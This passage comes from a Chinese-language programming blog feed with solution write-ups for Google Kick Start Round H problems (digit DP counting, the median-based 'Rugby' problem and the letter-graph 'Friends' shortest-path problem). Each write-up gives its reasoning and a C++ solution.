dp[i-1][0]*(X[i]/2) \\X_{equal} = dp[n][0] + dp[n][1] \\count[x] = \sum_{i=1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \\</script></li></ul><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">count</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.push_back(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(arr.begin(),arr.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arr.size(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> m = arr.size();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> l,r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = count(r) - count(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;":"&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Rugby-1"><a href="#Rugby-1" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p><h3 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 中位数。</p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ol><li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<script type="math/tex; mode=display">Target = min(\sum_{i=0}^{n-1}abs(x_{i}-X-i) + \sum_{i=0}^{n-1}abs(x_{i}-Y)</script></li><li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<script type="math/tex; mode=display">Y = \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}</script></li><li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i=0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i=0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<script type="math/tex; mode=display">(x_{0},x_{1}-1,x_{2}-2,x_{3}-3...,x_{n}-n)</script>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arrx(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>&gt; arry(n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arry.begin(),arry.end());</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(arrx.begin(),arrx.end());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id="Friends-1"><a href="#Friends-1" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p><h3 id="题意-5"><a href="#题意-5" class="headerlink" title="题意"></a>题意</h3><blockquote><p> 图的遍历</p><h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li><li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li><li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(e)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s-<span class="function"><span class="params">(c1)</span>-&gt;</span>s1-<span class="function"><span class="params">(c2)</span>-&gt;</span>s2-<span class="function"><span class="params">(c3)</span>-&gt;</span>s3-&gt;...<span class="function">-&gt;</span>sn-<span class="function"><span class="params">(cn)</span>-&gt;</span>t</span><br></pre></td></tr></table></figure>根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<script type="math/tex; mode=display">c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} .... \neq c_{n}</script>我们假设存在$c_{i} = c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li><li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">slove</span><span class="params">(<span class="keyword">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,q;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; arr(n);</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; dp(<span class="number">26</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(<span class="number">26</span>,INF));</span><br><span class="line">    <span class="built_in">vector</span>&lt;pii&gt; query(q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; ++i) <span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; q; ++i) <span class="built_in">cin</span>&gt;&gt;query[i].first&gt;&gt;query[i].second;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) dp[i][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s : arr)&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">bool</span>&gt; count(<span class="number">26</span>,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : s) count[c-<span class="string">'A'</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == k) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(count[j]&amp;&amp;count[k])&#123;</span><br><span class="line">                    dp[j][k] = <span class="number">1</span>;</span><br><span class="line">                    dp[k][j] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                dp[i][k] = min(dp[i][k],dp[i][j] + dp[j][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> v : query)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = v.first - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> y = v.second - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> curr = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> a : arr[x])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> b : arr[y])&#123;</span><br><span class="line">                curr = min(curr,dp[a-<span class="string">'A'</span>][b-<span class="string">'A'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(curr == INF ? (<span class="number">-1</span>) : (curr + <span class="number">2</span>))&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Case #"</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">": "</span>;</span><br><span class="line">        slove(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;google-kickstart-round-H&quot;&gt;&lt;a href=&quot;#google-kickstart-round-H&quot; class=&quot;headerlink&quot; title=&quot;google kickstart round H&quot;&gt;&lt;/a&gt;google kickstart round H&lt;/h1&gt;&lt;p&gt;&lt;code&gt;google kick start&lt;/code&gt;的题目果真经典并且又不失思考的乐趣，质量非常高的题目，我觉得思考的深度非常有代表性。&lt;/p&gt;&lt;h2 id=&quot;Problem-A-Retype&quot;&gt;&lt;a href=&quot;#Problem-A-Retype&quot; class=&quot;headerlink&quot; title=&quot;Problem A - Retype&quot;&gt;&lt;/a&gt;Problem A - Retype&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;选择游戏重启的位置&lt;/p&gt;&lt;h3 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;真心是送分问题，一共只有两种选择，要么从头开始，要么倒回到第&lt;code&gt;s&lt;/code&gt;关开始。&lt;script type=&quot;math/tex; mode=display&quot;&gt;
minT = k + min(n,k+n-2*s)&lt;/script&gt;&lt;h3 id=&quot;代码&quot;&gt;&lt;a href=&quot;#代码&quot; class=&quot;headerlink&quot; title=&quot;代码&quot;&gt;&lt;/a&gt;代码&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span 